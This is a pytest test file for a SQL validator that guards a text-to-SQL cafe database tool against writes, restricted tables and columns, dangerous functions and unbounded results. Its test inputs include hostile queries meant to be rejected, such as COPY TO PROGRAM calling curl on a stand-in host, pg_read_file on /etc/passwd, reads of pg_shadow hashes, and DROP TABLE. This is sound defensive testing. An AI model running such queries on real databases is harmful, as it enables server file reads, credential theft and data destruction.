import pytest

from app.sql_guard import BLOCKED_FUNCTIONS, SqlGuardError, validate_sql


def test_plain_select_passes_with_the_row_cap_added():
    assert validate_sql("SELECT name FROM cafes") == "SELECT name FROM cafes LIMIT 1000"


def test_delete_is_rejected():
    with pytest.raises(SqlGuardError):
        validate_sql("DELETE FROM cafes")


def test_multiple_statements_are_rejected():
    with pytest.raises(SqlGuardError, match="單一"):
        validate_sql("SELECT 1; DELETE FROM cafes")


@pytest.mark.parametrize("sql", ["", "   ", ";", " ; ;"])
def test_empty_sql_is_rejected(sql):
    with pytest.raises(SqlGuardError, match="空"):
        validate_sql(sql)


def test_unparseable_sql_is_rejected():
    with pytest.raises(SqlGuardError, match="無法解析"):
        validate_sql("SELEC name FROM")


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT name FROM cafes WHERE city = '台北市' UNION SELECT name FROM cafes WHERE city = '新北市'",
        "SELECT count(*) FROM cafes;",
        "WITH t AS (SELECT district FROM cafes) SELECT district, count(*) FROM t GROUP BY district",
    ],
)
def test_other_read_only_queries_pass(sql):
    validate_sql(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "INSERT INTO cafes (name, address) VALUES ('x', 'y')",
        "UPDATE cafes SET rating = 5",
        "DROP TABLE cafes",
        "TRUNCATE cafes",
        "CREATE TABLE t (i int)",
        "GRANT ALL ON cafes TO PUBLIC",
        "COPY cafes TO '/tmp/x'",
        "COPY (SELECT * FROM cafes) TO PROGRAM 'curl evil.example'",
    ],
)
def test_write_and_ddl_statements_are_rejected(sql):
    with pytest.raises(SqlGuardError):
        validate_sql(sql)


@pytest.mark.parametrize(
    "sql",
    [
        # Postgres allows data-modifying statements inside a CTE of a SELECT.
        "WITH d AS (DELETE FROM cafes RETURNING id) SELECT count(*) FROM d",
        # SELECT INTO creates a new table.
        "SELECT * INTO cafes_copy FROM cafes",
    ],
)
def test_writes_hidden_inside_a_select_are_rejected(sql):
    with pytest.raises(SqlGuardError, match="不允許"):
        validate_sql(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM pg_shadow",  # system catalog: password hashes
        "SELECT * FROM pg_catalog.pg_user",
        "SELECT table_name FROM information_schema.tables",
        "SELECT name FROM cafes WHERE id IN (SELECT id FROM secret_table)",  # hidden in a subquery
        "SELECT * FROM other_schema.cafes",  # same name, different schema
        "SELECT * FROM genbi.public.cafes",  # three-part name
        "SELECT c.name FROM cafes c JOIN line_accounts u ON u.id = c.id",
    ],
)
def test_tables_outside_the_allowlist_are_rejected_with_available_tables_listed(sql):
    with pytest.raises(SqlGuardError, match="可用的資料表：cafes"):
        validate_sql(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "WITH t AS (SELECT city FROM CAFES) SELECT city FROM t",  # CTE name + upper case
        'SELECT name FROM "cafes"',
        "SELECT name FROM public.cafes",
        "SELECT a.name FROM cafes a JOIN cafes b ON a.district = b.district",
        "SELECT n FROM generate_series(1, 3) AS g(n)",  # table function, not a table
    ],
)
def test_allowlisted_tables_ctes_and_public_schema_pass(sql):
    validate_sql(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT count(*) FROM users",
        "SELECT district, count(*) FROM search_logs GROUP BY district",
        "SELECT day, searches FROM v_daily_activity",
        "SELECT u.member_type, count(*) FROM search_logs s JOIN users u ON u.id = s.user_id GROUP BY 1",
    ],
)
def test_members_searches_and_daily_activity_are_allowlisted(sql):
    validate_sql(sql)


def test_allowlist_can_be_configured():
    with pytest.raises(SqlGuardError, match="可用的資料表：search_logs"):
        validate_sql("SELECT name FROM cafes", allowed_tables={"search_logs"})


def test_cte_name_only_covers_its_own_query():
    # The outer "secret" is the real table: the CTE is only visible inside the subquery.
    with pytest.raises(SqlGuardError, match="secret"):
        validate_sql("SELECT * FROM (WITH secret AS (SELECT 1 AS a) SELECT a FROM secret) x, secret")


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT line_user_id FROM cafes",
        'SELECT "LINE_USER_ID" FROM cafes',  # quoted + upper case
        "SELECT c.Line_User_Id FROM cafes c",
        "SELECT name FROM cafes WHERE line_user_id IS NOT NULL",  # not only in the select list
        "SELECT count(DISTINCT line_user_id) FROM cafes",
    ],
)
def test_blocked_columns_are_rejected_anywhere(sql):
    with pytest.raises(SqlGuardError, match="不允許的欄位"):
        validate_sql(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT pg_sleep(10) FROM cafes",  # hold a connection
        "SELECT name FROM cafes WHERE PG_SLEEP(1) IS NULL",  # upper case, in WHERE
        "SELECT pg_read_file('/etc/passwd')",  # read server files
        "SELECT * FROM dblink('host=x', 'select 1') AS t(a int)",  # in FROM, reach another DB
        "SELECT set_config('statement_timeout', '0', false)",  # lift our limits
        "SELECT current_setting('data_directory')",
        "SELECT pg_terminate_backend(1)",
        "SELECT * FROM pg_ls_dir('.')",
    ],
)
def test_dangerous_functions_are_rejected_anywhere(sql):
    with pytest.raises(SqlGuardError, match="不允許的函式"):
        validate_sql(sql)


def test_ordinary_functions_pass():
    validate_sql("SELECT district, round(avg(rating), 2), count(*) FROM cafes GROUP BY district")


@pytest.mark.parametrize("name", sorted(BLOCKED_FUNCTIONS))
def test_every_blocked_function_is_caught_by_the_parser(name):
    # Fails if a sqlglot upgrade starts parsing one of them as a typed function.
    with pytest.raises(SqlGuardError, match="不允許的函式"):
        validate_sql(f"SELECT {name}('x')")


@pytest.mark.parametrize(
    ("sql", "expected"),
    [
        ("SELECT name FROM cafes LIMIT 999999", "SELECT name FROM cafes LIMIT 1000"),  # too big: capped
        ("SELECT name FROM cafes LIMIT 10", "SELECT name FROM cafes LIMIT 10"),  # smaller: kept
        ("SELECT name FROM cafes LIMIT 1000", "SELECT name FROM cafes LIMIT 1000"),  # exactly the cap
        ("SELECT name FROM cafes LIMIT ALL", "SELECT name FROM cafes LIMIT 1000"),  # unbounded
        ("SELECT name FROM cafes LIMIT (SELECT 99999)", "SELECT name FROM cafes LIMIT 1000"),  # not a literal
        ("SELECT name FROM cafes FETCH FIRST 5 ROWS ONLY", "SELECT name FROM cafes LIMIT 5"),
        ("SELECT name FROM cafes FETCH FIRST 5000 ROWS ONLY", "SELECT name FROM cafes LIMIT 1000"),
        (
            "SELECT name FROM cafes UNION SELECT district FROM cafes",  # cap the whole union
            "SELECT name FROM cafes UNION SELECT district FROM cafes LIMIT 1000",
        ),
        (
            "SELECT name FROM cafes WHERE id IN (SELECT id FROM cafes LIMIT 5000)",  # inner limit untouched
            "SELECT name FROM cafes WHERE id IN (SELECT id FROM cafes LIMIT 5000) LIMIT 1000",
        ),
    ],
)
def test_row_cap_is_enforced_on_the_outer_query(sql, expected):
    assert validate_sql(sql) == expected


def test_row_cap_can_be_configured():
    assert validate_sql("SELECT name FROM cafes LIMIT 80", max_rows=50) == "SELECT name FROM cafes LIMIT 50"


@pytest.mark.parametrize("max_rows", [0, -1])
def test_non_positive_row_cap_is_a_configuration_error(max_rows):
    # A broken setting is the operator's bug, not the model's: not a SqlGuardError.
    with pytest.raises(ValueError, match="max_rows") as info:
        validate_sql("SELECT name FROM cafes", max_rows=max_rows)
    assert not isinstance(info.value, SqlGuardError)
